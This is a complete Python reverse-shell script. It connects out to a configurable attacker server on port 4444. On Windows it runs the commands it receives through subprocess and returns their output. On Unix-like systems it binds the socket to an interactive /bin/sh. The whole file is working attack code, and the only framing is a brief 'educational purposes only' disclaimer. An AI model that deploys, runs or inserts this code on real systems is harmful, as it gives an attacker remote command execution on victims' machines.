#!/usr/bin/env python3

import socket
import subprocess
import os
import threading
import sys

# WARNING: This script is for educational purposes only.
# Using this script on unauthorized systems is illegal and unethical.
# Only use in controlled environments where you have explicit permission.

def reverse_shell():
    # Configuration - Change these to your attacker's server IP and port
    SERVER_HOST = "0.0.0.0"  # Replace with your server IP
    SERVER_PORT = 4444        # Replace with your server port
    
    # Create socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Connect to the server
    try:
        print(f"Attempting to connect to {SERVER_HOST}:{SERVER_PORT}...")
        s.connect((SERVER_HOST, SERVER_PORT))
        print("Connection established successfully!")
    except Exception as e:
        print(f"Connection failed: {e}")
        return
    
    # Check if running on Windows or Unix-like system
    if os.name == 'nt':  # Windows
        # Send test message immediately
        s.send(b'HELLO FROM WINDOWS MACHINE\r\n')
        s.send(b'Reverse shell connected successfully!\r\n')
        s.send(b'Type commands and press Enter:\r\n')
        s.send(b'C:\\> ')
        
        try:
            while True:
                # Receive command from attacker
                data = s.recv(1024)
                if not data:
                    break
                    
                command = data.decode('utf-8', errors='ignore').strip()
                print(f"Received command: {command}")
                
                if command.lower() in ['exit', 'quit']:
                    s.send(b'Goodbye!\r\n')
                    break
                
                # Execute command and capture output
                try:
                    result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
                    output = result.stdout
                    if result.stderr:
                        output += result.stderr
                    if not output.strip():
                        output = "[Command completed with no output]\n"
                except subprocess.TimeoutExpired:
                    output = "[Command timed out]\n"
                except Exception as e:
                    output = f"[Error: {str(e)}]\n"
                
                # Send output back
                s.send(output.encode('utf-8', errors='ignore'))
                s.send(b'\r\nC:\\> ')
                
        except Exception as e:
            print(f"Error in shell loop: {e}")
        finally:
            s.close()
    else:  # Unix-like (Linux, macOS)
        # Duplicate file descriptors for stdin, stdout, stderr
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        
        # Spawn a shell
        shell = subprocess.call(["/bin/sh", "-i"])

if __name__ == "__main__":
    reverse_shell()
